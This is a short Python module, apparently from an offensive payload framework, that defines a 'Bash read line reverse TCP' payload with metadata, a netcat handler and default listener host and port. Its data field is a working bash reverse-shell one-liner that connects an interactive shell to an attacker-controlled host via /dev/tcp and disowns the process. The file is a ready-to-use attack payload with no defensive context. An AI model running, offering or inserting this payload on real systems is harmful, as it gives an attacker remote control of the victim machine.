class Payload:

    info = {
        'Title': 'Bash read line reverse TCP',
        'Author': 'Unknown',
        'Description': 'Bash read line reverse TCP',
        'References': ['https://revshells.com']
    }

    meta = {
        'handler': 'netcat',
        'type': 'bash-read-line',
        'os': 'linux'
    }

    parameters = {
        'lhost': '0.0.0.0',
        'lport': '9001'
    }

    data = "bash -c 'bash -i >& /dev/tcp/*LHOST*/*LPORT* 0>&1 & disown'"
